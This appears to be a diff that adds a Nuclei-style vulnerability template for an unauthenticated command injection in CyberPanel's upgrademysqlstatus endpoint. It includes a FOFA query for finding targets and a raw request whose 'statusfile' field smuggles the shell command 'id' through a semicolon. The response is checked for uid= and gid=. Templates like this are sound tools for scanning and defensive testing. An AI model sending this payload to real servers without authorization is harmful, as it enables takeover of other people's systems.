@@ -1,0 +1,39 @@
+id: CyberPanel-upgrademysqlstatus-RCE
+info:
+  name: "CyberPanel upgrademysqlstatus接口未认证远程代码执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="CyberPanel"
+    CyberPanel的upgrademysqlstatus接口存在身份验证机制缺失及参数过滤不足问题。攻击者可利用此缺陷在无权限验证的情况下执行任意系统命令，导致服务器控制权被完全接管。当前该漏洞利用细节及PoC已公开于互联网，建议受影响用户立即进行安全加固以降低风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488694&idx=1&sn=7d5357b8756064c5a0cc84d76e1e00b3&chksm=c267a185f51028933c44030cf2fdd3ba043a782064480b2dcdb38295a59e83f76e089604a7a6&token=555018471&lang=zh_CN#rd
+  tags: CyberPanel
+
+
+http:
+- raw:
+  - |
+    OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Type: application/json
+
+    {"statusfile":"/dev/null; id; #"}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
